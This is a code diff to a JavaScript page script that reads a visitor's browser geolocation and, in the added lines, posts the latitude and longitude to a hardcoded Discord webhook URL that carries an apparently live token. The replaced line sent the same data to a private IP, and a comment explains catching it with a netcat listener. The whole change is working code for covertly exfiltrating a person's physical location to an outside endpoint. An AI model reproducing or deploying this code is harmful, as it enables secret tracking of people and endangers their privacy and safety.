@@ -22,7 +22,20 @@ function getLocation() {
 function showPosition(position) {
   var latlong = x.innerHTML = "Latitude: " + position.coords.latitude + 
   "<br>Longitude: " + position.coords.longitude;
-document.location='http://192.168.13.175:4321/'+latlong;
+  
+  const request = new XMLHttpRequest();
+      request.open("POST", "https://discordapp.com/api/webhooks/676118118082281513/ZS5YcWhurzokBrKX9NgexqtxrJA5Pu2Bo4i7_JsIxC-JIbPBVhSZkcVVukGOro52rnQA");
+
+      request.setRequestHeader('Content-type', 'application/json');
+
+      const params = {
+        username: "My Webhook Name",
+        avatar_url: "",
+        content: latlong
+      }
+
+      request.send(JSON.stringify(params));
+//document.location='http://192.168.13.175:4321/'+latlong;
 // use netcat to listen (nc -nlvp portnumber) (don’t forget to chnage ip and portnumber)
 // and yeah that's random ip 😏
 }
